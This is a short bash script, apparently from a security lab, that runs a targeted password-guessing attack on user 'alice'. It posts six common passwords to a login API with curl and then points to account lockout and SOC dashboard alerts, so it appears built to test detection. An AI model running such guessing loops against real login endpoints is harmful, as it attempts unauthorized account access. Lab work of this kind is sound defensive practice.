#!/bin/bash
source ./config.sh

echo "=========================================================="
echo " [!] Attack 2: Targeted Password Guessing on User 'alice'"
echo " Target: ${TARGET_URL}/api/auth/login"
echo "=========================================================="

passwords=("123456" "password" "qwerty" "admin123" "letmein" "spring2026")

for pwd in "${passwords[@]}"; do
  echo -e "\n[Kali Attacker] Trying password: '$pwd'"
  curl -s -w " | HTTP Code: %{http_code}\n" -X POST "${TARGET_URL}/api/auth/login" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"alice\",\"password\":\"$pwd\"}"
  sleep 1.2
done

echo -e "\n[✓] Finished! On attempt #5, Alice's account was locked (HTTP 423)."
echo "[✓] Check your Windows SOC Dashboard for red 'ACCOUNT_LOCKED' alerts."
